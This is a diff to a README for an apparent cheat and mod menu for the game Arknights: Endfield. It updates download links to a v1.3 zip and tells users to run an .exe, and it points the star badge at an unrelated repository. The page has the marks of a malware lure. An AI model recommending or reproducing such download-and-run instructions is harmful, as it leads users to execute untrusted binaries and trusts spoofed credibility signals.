@@ -1,11 +1,11 @@
 # Arknights: Endfield Cheat & Mod Menu
 
-(UPD: 16 Aug 2026)
+(UPD: 19 Aug 2026)
 
-[![Download Latest](https://img.shields.io/badge/Download-Latest-brightgreen?style=for-the-badge&logo=github)](https://github.com/colonylegendsport/Endfield-trainer/releases/download/v1.2/Endfield.Mod-v1.2.zip)
-[![GitHub release](https://img.shields.io/badge/Release-v1.1-blue?style=for-the-badge)](https://github.com/colonylegendsport/Endfield-trainer/releases/download/v1.2/Endfield.Mod-v1.2.zip)
+[![Download Latest](https://img.shields.io/badge/Download-Latest-brightgreen?style=for-the-badge&logo=github)](https://github.com/colonylegendsport/Endfield-trainer/releases/download/v1.3/Endfield.Mod-v1.3.zip)
+[![GitHub release](https://img.shields.io/badge/Release-v1.3-blue?style=for-the-badge)](https://github.com/colonylegendsport/Endfield-trainer/releases/download/v1.3/Endfield.Mod-v1.3.zip)
 [![License: Apache 2.0](https://img.shields.io/badge/License-Apache%202.0-blue?style=for-the-badge)](https://opensource.org/licenses/Apache-2.0)
-[![GitHub Stars](https://img.shields.io/github/stars/colonylegendsport/Endfield-trainer?style=for-the-badge&logo=github)](https://github.com/colonylegendsport/Endfield-trainer/stargazers)
+[![GitHub Stars](https://img.shields.io/github/stars/sglkc/endfield-auto-daily?style=for-the-badge&logo=github)](https://github.com/colonylegendsport/Endfield-trainer/stargazers)
 
 A powerful trainer tool for Arknights: Endfield with clean in-game overlay
 
@@ -29,10 +29,10 @@ A powerful trainer tool for Arknights: Endfield with clean in-game overlay
 ---
 
 ## How to Install
-1. Download the [latest release build](https://github.com/colonylegendsport/Endfield-trainer/releases/download/v1.2/Endfield.Mod-v1.2.zip) from repo's Releases page.
+1. Download the [latest release build](https://github.com/colonylegendsport/Endfield-trainer/releases/download/v1.3/Endfield.Mod-v1.3.zip) from repo's Releases page.
 2. Extract the contents to any folder (e.g., `C:\Endfieldghghgh` or Desktop).
 3. Launch game.
-4. Run `Endfield_github-1.2.exe`.
+4. Run `Endfield_github-1.3.exe`.
 5. Enjoy. Press the toggle hotkey (default: `[Insert]`) to open the menu.
 
 ---
@@ -63,8 +63,7 @@ The trainer is updated regularly to support the latest game version. Check the r
 
 Simply delete the extracted folder. There are no registry changes or leftover files.
 
----
 
-[Download Latest Version](https://github.com/colonylegendsport/Endfield-trainer/releases/download/v1.2/Endfield.Mod-v1.2.zip)
+
 
 [![Made with C++](https://img.shields.io/badge/Made%20with-C++-f34b7d?style=for-the-badge&logo=c%2B%2B)](https://github.com/colonylegendsport/Endfield-trainer)
